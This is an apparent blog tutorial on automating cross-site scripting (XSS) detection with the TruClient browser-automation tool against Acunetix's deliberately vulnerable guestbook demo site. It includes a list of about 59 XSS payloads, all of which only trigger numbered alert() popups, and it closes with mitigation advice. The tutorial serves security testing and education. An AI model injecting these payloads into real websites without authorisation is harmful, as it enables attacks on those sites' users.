# :globe_with_meridians: Automate XSS testing with real browser rendering

---

# Automate XSS testing with real browser rendering

Summary

In this article I will explain what Cross-Site Scripting (XSS) is, but most importantly I will show you how to automatically detect this. This is a challenge, because it requires full browser rendering.

Disclaimer

This article is for informational and educational purpose only, and for those who’re willing and curious to know and learn about Security and Penetration Testing. The content may not be used for illegal purposes. If you’re ready to learn something new for the good, then read on.

Details

Cross-site scripting (XSS) is a web security vulnerability that allows attackers to compromise user interaction with vulnerable web applications. In a cross-site scripting attack, an attacker injects malicious browser-side script into a trusted website. Since the script runs on the target website, no Same Origin Policy (SOP) restrictions are triggered. Assuming the script comes from a trusted source, the script can access cookies, session tokens, or other sensitive information stored in the victim’s browser and used by the target website.

This allows attackers to circumvent the same-origin policy, which is intended to separate different websites. Cross-site scripting vulnerabilities typically allow an attacker to impersonate a victim user, perform any action that the user could take, and gain access to the user’s data. If the victim user has privileged access to the application, the attacker could gain complete control over all application functions and data.

There are 3 type of XSS attacks. Those are:

Stored XSS: malicious JavaScript is stored in the database and displayed in the server response when invoked. An example of stored XSS that is a guestbook feature in the target application.

Reflected XSS: the malicious JavaScript is not stored, but is shown (reflected) in the server response. For example, an error message like ‘file <JavaScript input> not found’.

DOM-based: XSS code is executed in the page’s Document Object Model (DOM) by the browser.. The vulnerability is in the client-side code, not the server-side code.

Reflected XSS and DOM-based XSS rely heavily on social engineering. Before the malicious JavaScript code is executed, it must first be injected somehow. A big advantage of stored XSS is that it doesn’t rely on social engineering. Malicious code resides persistently in database of the vulnerable website.

Why this post?

Most dynamic XSS detection tools focus on the contents of the server response. If the payload is returned (reflected) inside corresponding the server response, it is marked as possible XSS vulnerability. This testing method has two major drawbacks. First of all, the server response is not interpreted by an actual browser. Since XSS is a client-side vulnerability, only a real browser is able to validate whether a payload will work. Second, these dynamic testing tools will not find any DOM-based XSS vulnerabilities. This is because with DOM-based XSS, the payload is never reflected in the server response. While DOM-based XSS detection can be done using static code analysis, validation must be done using a real browser. To fully detect and validate XSS vulnerabilities, a real browser should interpret the payload.

This demo uses the Acunetix test website [http://testphp.vulnweb.com/guestbook.php.](http://testphp.vulnweb.com/guestbook.php.) This website contains a guestbook that is vulnerable to XSS. For example, if we add payload *<script>alert(5)</script>*, it generates a JavaScript popup with the number “5”.

*Firefox executes code <script>alert(5)</script>*

When this request is loaded through Burp Suite proxy, no JavaScript is executed. The Burp Suite ‘render’ option is not able to show the JavaScript popup.

*Burp Suite does not execute JavaScript.*OpenText / Microfocus TruClient

In the world of “test automation” you can find tools that can imitate real users. For example, Selenium WebDriver can be used for browser automation testing. This article describes a tool from the performance testing world: the TruClient tool.

TruClient is a powerful yet easy-to-use browser-based performance, utilization, automation, and monitoring testing tool. TruClient is available in several editions of Virtual User Generator (VuGen), TruClient Lite, and TruClient Standalone. The tool is only available for Microsoft Windows.

This article focuses on TruClient standalone edition. Learn how powerful this tool is for dynamically testing XSS vulnerabilities!

Setup your lab environment

This PoC consists a Windows attacker machine and the free online testing site [http://testphp.vulnweb.com/guestbook.php](http://testphp.vulnweb.com/guestbook.php). The target website intended use is as a test and demonstration site for Acunetix Web Vulnerability Scanner.

Attacker machine:

- Windows 10 Professional [Version 10.0.19044.3086]

- Security: Default settings for Windows Defender antivirus detection

- Software: OpenText / Microfocus TruClient.

## Part 1, install TruClient on your attacker machine

1. Register an account with Microfocus (since January 2024 purchased by OpenText)

Navigate to [https://www.microfocus.com/marketplace/appdelivery/signup](https://www.microfocus.com/marketplace/appdelivery/signup) and start the registration process. You have to use an email address to confirm your registration.

2. Confirm your registration

Now check you email inbox (see email address step 1) and confirm your registration.

3. Download the latest version of TruClient Standalone edition.

Navigate to

[https://www.microfocus.com/marketplace/appdelivery/content/truclient](https://www.microfocus.com/marketplace/appdelivery/content/truclient).

Click on [Download].

4. Start the installation process.

Run the installer file (MF_TruClient_2022.01_Windows.exe) as a local administrator.

Intuitive prompts and pop-ups appear during the rest of the TruClient setup. I’m not going to put some of them here, it’s very easy.

## Part 2, create your skeleton script

5. Start TruClient as a local Administrator and select script type 'Web'.

6. Select the TruClient Browser (the other browsers may block XSS payloads)

Two new windows will open, on the left the “develop script” window and on the right the “TruClient browser”.

The TruClient browser will point to the default URL:

file:///C:/Program%20Files%20(x86)/Micro%20Focus/TruClient/dat/WebTruClientBrowser/extensions/TruClientBrowser@tc.com/newtab.html

7. TruClient browser: Paste the URL of your target website (in this demo [http://testphp.vulnweb.com/guestbook.php](http://testphp.vulnweb.com/guestbook.php)) into the TruClient navigation bar. Do not press Enter.

We will test for XSS in the Acunetix PHP “Guestbook” site.

8. Develop script window: Start the script recording process.

9. TruClient browser: Press enter to navigate to the target website.

Notice a new step “Navigating to …” is recorded inside the develop script window.

## Get Nol White Hat’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

10. TruClient browser: Click inside the guestbook text box and type the string ‘test’.

11. TruClient browser: Click [Add message]

12. Develop script window: Now stop the recording.

13. Develop script window: Replay the recording.

The script should replay without any errors.

## Part 3, customize your XSS attack script

Next we will parameterize our script. This means will try to feed XSS payloads as the parameter value in the Guestbook textbox.

14. Develop script window: Select step “Type test in Your profile textbox” and click the arrow sign to open the extra options.

15. Develop script window: Now click the arrow sign next to Arguments.

16. Develop script window: Change the ‘Typing Interval’ to 50 ms.

17. Develop script window: Select string ‘test’ and right click to open the menu. Now click “Create New Parameter From Selection”

18. Develop script window: In the pop-up window, type ‘xss_payloads’ and click [OK]

19. Develop script window: Now, click on the upper [p] to edit the parameters

20. Develop script window: In the popup window, select parameter ‘xss_payloads’.

21. Develop script window: Click on [+ Add row] to add your payloads.

Now, we can add our XSS payloads. First, we will add some payloads one by one. Later, we can try to add bulk payloads (see section Tips and Tricks).

For now, we will use the following payloads:

```
</scrip</script>t><img src =q onerror=alert(1)>
<image src/onerror=alert(2)>
javascript:alert(3)
"onmouseover="alert(4)
<script>alert(5)</script>
```

Tip: use a unique identifier in every payload. For example, use a unique number in the alert() function, such as <script>alert(5)</script>.

Also, write down the number of rows,. We need this information later, so we can add the correct 'for loop' in our script. As you can see in the screenshot below, we are dealing with 6 rows.

22. Develop script window: Change update value to “each occurance” and click [OK].

23. Develop script window: Press and hold the shift key. Now select the steps “Click your profile”, “Type xss_payloads …” and “Click on add message button”

24. Right click to open the menu. Click on Group Into > For Loop Clause.

25. Develop script window: Now, change the number of loop iterations to the number of payloads, In our case: 6.

26. Develop script window: Last but not least, save your script! We save our script in folder C:\temp\medium_demo.

The moment of truth has arrived. We can try this simple TruClient XSS script.

27. Develop script window: Click on the play button.

When we hit our first payload, it’s bingo!

The replay shows an alert with value “1”. This corresponds with our first XSS payload: *</scrip</script>t><img src =q onerror=alert(1)>*.

If you want to try more payloads, you have to press the [OK] button yourself to find the next XSS detection. Our next detection is alert number 2, this this corresponds to payload *<image src/onerror=alert(2)>*.

Tips and tricks

At step 21 we manually added our XSS payloads. These payload entries are stored in the following file <script folder><parameter_name>.dat. In our case C:\Temp\medium_demo\xss_payloads.dat. In stead of manually entering our payloads, we can use Notepad to directly edit this file and add more payloads. Watch out, the tool doesn't like certain characters, such as the comma. You can workaround this by url encoding ([https://www.urlencoder.org/](https://www.urlencoder.org/)) the comma character. For example, replace commas with %2C.

You can use the following list to try 59 different payloads. Don't forget to change the number of for loop iterations to 60 (see step 25).

```
xss_payloads
test
</scrip</script>t><img src =q onerror=alert(1)>
<image src/onerror=alert(2)>
javascript:alert(3)
"onmouseover="alert(4)
<script>alert(5)</script>
<script\x20type="text/javascript">javascript:alert(06);</script>
<script\x3Etype="text/javascript">javascript:alert(07);</script>
<script\x0Dtype="text/javascript">javascript:alert(08);</script>
<script\x09type="text/javascript">javascript:alert(09);</script>
<script\x0Ctype="text/javascript">javascript:alert(10);</script>
<script\x2Ftype="text/javascript">javascript:alert(11);</script>
<script\x0Atype="text/javascript">javascript:alert(12);</script>
"onmouseover="alert(13)
'`"><\x3Cscript>javascript:alert(14)</script>
'`"><\x00script>javascript:alert(15)</script>
\'-alert(16)}//
\\"-alert(17)}//
\\'-alert(18)}//
\"-alert(19)//
\'-alert(20)//
\\"-alert(21)//
\\'-alert(22)//
test'+alert(23)+'
${alert(24)}
{{$on.constructor('alert(25)')()}}
1&toString().constructor.prototype.charAt%3d[].join;[1]||orderBy:toString().constructor.fromCharCode(120%2C61%2C97%2C108%2C101%2C114%2C116%2C40%2C50%2C54%2C41)=1
"><body onresize=alert(27)>
onfocus=alert(28) tabindex=1>#x
<svg><animatetransform onbegin=alert(29) attributeName=transform>
<svg><animatetransform%20onbegin=alert(30)>
</script><image src/onerror=alert(31)>
http://foo?&apos;-alert(32)-&apos;
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(33)//'>
<IMG SRC="javascript:alert(34);">
IMG SRC=javascript:alert(35)>
<IMG SRC=JaVaScRiPt:alert(36)>
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
<IMG SRC=`javascript:alert(37)`>
\<a onmouseover="alert(38)"\>xxs link\</a\>
\<a onmouseover=alert(39)\>xxs link\</a\>
<IMG """><SCRIPT>alert(40)</SCRIPT>"\>
<IMG SRC=javascript:alert(String.fromCharCode(52%2C49))>
<IMG SRC=# onmouseover="alert(42)">
<IMG onmouseover="alert(43)">
<IMG SRC=/ onerror="alert(String.fromCharCode(52%2C54))"></img>
<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0
000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#
83;&#39;&#41;>
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#000
0108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x
29>
<IMG SRC="jav ascript:alert(49);">
<IMG SRC="jav&#x09;ascript:alert(50);">
<IMG SRC="jav&#x0A;ascript:alert(51);">
<IMG SRC="jav&#x0D;ascript:alert(52);">
<IMG SRC=" &#14; javascript:alert(53);">
<BODY onload!#$%&()*~+-_.%2C:;?@[/|\]^`=alert(54)>
<<SCRIPT>alert(55);//\<</SCRIPT>
<IMG SRC="`<javascript:alert>`(56)"
\";alert(57);//
</script><script>alert(58);</script>
</TITLE><SCRIPT>alert(59);</SCRIPT>
```

Mitigation recommendations.

In general, effective prevention of XSS vulnerabilities may require a combination of the following countermeasures:

· Filter input on arrival. When user input comes in, filter it as closely as possible based on expected or valid input.

· Encode data on output. Encode the output where user-controllable data is printed in the HTTP response so that it is not interpreted as active content.

References

[https://portswigger.net/web-security/cross-site-scripting](https://portswigger.net/web-security/cross-site-scripting)

[https://community.microfocus.com/devops-cloud/lr-professional/f/discussions/322652/is-truclient-standalone-free\](https://community.microfocus.com/devops-cloud/lr-professional/f/discussions/322652/is-truclient-standalone-free/)

---
